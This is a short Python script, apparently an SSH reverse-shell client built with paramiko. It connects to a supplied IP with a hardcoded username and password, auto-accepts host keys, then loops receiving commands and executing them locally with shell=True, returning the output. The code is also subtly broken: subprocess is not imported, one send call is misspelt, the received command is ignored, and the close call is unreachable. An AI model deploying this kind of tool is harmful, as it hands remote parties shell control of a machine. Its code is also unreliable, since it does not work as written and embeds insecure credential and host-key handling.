import paramiko
from paramiko_decorators import auth
import sys


@auth
def run_client(ip, cmd):
    client = paramiko.SSHClient()
    # client.load_host_keys('/Users/evesan/.ssh/known_hosts')
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(
        ip,
        username="StJimmy",
        password="isback",
        timeout=20
    )

    try:
        ssh_session = client.get_transport().open_session()
    except Exception as e:
        print("[-] " + str(e))
        sys.exit(1)
    if ssh_session.active:
        ssh_session.send(cmd)
        print(ssh_session.recv(1024))
        while True:
            command = ssh_session.recv(1024)
            try:
                cmd_output = subprocess.check_output(cmd, shell=True)
                ssh_session.snd(cmd_output)
            except Exception as e:
                ssh_session.send(str(e))
        client.close()
    else:
        print("Not connected")
